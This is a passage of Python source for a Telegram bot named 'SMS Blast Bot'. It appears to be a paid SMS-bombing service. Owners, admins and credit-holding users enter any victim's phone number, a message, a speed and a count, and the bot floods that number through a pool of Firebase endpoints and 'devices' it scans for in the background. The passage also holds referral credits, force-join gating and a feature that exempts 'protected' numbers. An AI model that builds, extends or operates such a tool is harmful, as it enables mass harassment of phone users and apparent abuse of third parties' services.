        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        [btn("ᴇxᴘᴏʀᴛ ᴅʙ", "owner:export_db", EMOJI_GEAR, "📦"), btn("ɪᴍᴘᴏʀᴛ ᴅʙ", "owner:import_db", EMOJI_GEAR, "📥")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("firebase editor", "owner:db_editor", EMOJI_FIRE, "🔥"), btn("backup firebase", "owner:backup_fb", EMOJI_GEAR, "📦")],
        [btn("daily reward", "owner:daily_reward", EMOJI_GIFT, "🎁")],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary"), btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success")],
        [btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹", style="primary"), btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳", style="primary")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁", style="primary"), btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary")],
        [btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary"), btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜", style="primary")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸", style="primary")],
        [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️", style="primary")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        vid_label = f"Video #{idx}"
        rows.append([btn(vid_label, "noop", EMOJI_VIDEO, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])
    
    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass

    save(d)  # Always save after start to persist new user data

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}\nManager: @Titanium_Ansh")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein. Sahilxalone.t.me ", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_answer(cq, "❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return

    await safe_answer(cq, "✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_answer(cq, "⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await safe_answer(cq, "🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number, F.text)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message, F.text)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        await _notify_scan_running(cq, "user")
        return
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count, F.text)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi device cached nahi dikh rahi — {em(EMOJI_GEAR, '🔄')} background scan chalu ho gaya (~3-4 min).\n\nThodi der baad <b>send sms</b> flow dobara start karo.",
            reply_markup=kb([(f"{sc('home')}", "user:home")]),
            parse_mode="HTML"
        )
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data.in_({"user:check_devices", "owner:check_devices", "admin:check_devices"}))
async def check_devices_callback(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = cq.data.split(":", 1)[0]
    if prefix == "owner" and not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if prefix == "admin" and not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    devices = get_cached_devices()
    if devices:
        await safe_answer(cq, f"🟢 {len(devices)} devices online!")
        try:
            await cq.message.edit_text(
                f"{em(EMOJI_CHECK, '🟢')} <b>{len(devices)} devices abhi online hain!</b>\n\n"
                f"Ab <b>send sms</b> se flow start karo — sab ready hai.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=f"{sc('home')}", callback_data=f"{prefix}:home")]
                ]),
                parse_mode="HTML"
            )
        except TelegramBadRequest:
            pass
    else:
        await safe_answer(cq, "😴 Abhi bhi koi device nahi — 2 min baad dobara dabao")

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number, F.text)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message, F.text)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        await _notify_scan_running(cq, cq.data.split(":", 1)[0])
        return
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count, F.text)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi device cached nahi dikh rahi — {em(EMOJI_GEAR, '🔄')} background scan chalu ho gaya (~3-4 min).\n\nThodi der baad <b>send sms</b> flow dobara start karo.",
            reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number, F.text)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message, F.text)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        await _notify_scan_running(cq, cq.data.split(":", 1)[0])
        return
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

